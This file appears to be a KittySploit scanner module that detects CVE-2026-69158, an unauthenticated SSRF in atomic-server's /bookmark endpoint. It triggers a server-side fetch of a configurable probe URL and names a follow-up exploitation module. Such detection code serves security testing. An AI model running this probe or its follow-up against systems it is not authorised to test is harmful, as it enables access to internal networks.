#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-69158 — atomic-server /bookmark SSRF."""

from kittysploit import *
from lib.protocols.http.atomic_server import Atomic_server
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client, Atomic_server):
    __info__ = {
        "name": "atomic-server CVE-2026-69158 SSRF detect",
        "description": "Unauthenticated /bookmark?url= server-side fetch.",
        "author": ["LLCForge", "KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-69158"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-69158"],
        "tags": ["atomic-server", "ssrf", "cve-2026-69158"],
        "agent": {
            "chain": {
                "suggested_followups": [
                    "auxiliary/admin/http/atomic_server_cve_2026_69158_ssrf",
                ],
            },
        },
    }

    ssrf_probe = OptString(
        "http://example.com/",
        "URL used to probe /bookmark",
        required=False,
        advanced=True,
    )

    def run(self):
        if not self.as_fingerprint().get("reachable"):
            return False
        code, body = self.as_bookmark_fetch(str(self.ssrf_probe or "http://example.com/"))
        if code == 200 and len(body) > 50:
            self.set_info(
                severity="critical",
                cve="CVE-2026-69158",
                reason="SSRF via /bookmark",
                bytes=len(body),
            )
            return True
        return False